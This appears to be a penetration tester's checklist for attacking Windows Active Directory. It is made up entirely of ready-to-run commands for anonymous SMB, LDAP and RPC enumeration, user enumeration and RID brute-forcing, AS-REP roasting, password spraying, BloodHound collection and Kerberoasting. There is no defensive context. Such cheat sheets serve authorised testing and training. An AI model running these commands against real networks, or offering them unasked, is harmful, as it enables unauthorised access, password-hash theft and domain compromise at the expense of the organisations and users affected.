# 🏰 Active Directory Tactical Guide

### 🛰️ Phase 1: Null Session & Guest Access
- [ ] **SMB Null Session:** `nxc smb <IP> -u '' -p '' --shares`
- [ ] **LDAP Anonymous Bind:** `nmap -n -sV --script "ldap* and not brute" -p 389 <IP>`
- [ ] **RPC Enumeration:** `rpcclient -U "" -N <IP>`

### 🏹 Phase 2: User Enumeration
- [ ] **Kerbrute User Enumeration:** `kerbrute userenum --dc <IP> -d <DOMAIN> users.txt`
- [ ] **RID Cycling:** `nxc smb <IP> -u 'guest' -p '' --rid-brute`

### 🕯️ Phase 3: Initial Exploitation
- [ ] **AS-REP Roasting:** `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -dc-ip <IP>`
- [ ] **Password Spraying:** `nxc smb {{target}} -u users.txt -p 'Spring2024!' --continue-on-success`

### 🩸 Phase 4: Domain Dominance
- [ ] **BloodHound Collection:** `python3 bloodhound.py -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_NAME> -c All`
- [ ] **Kerberoasting:** `impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip {{target}} -request`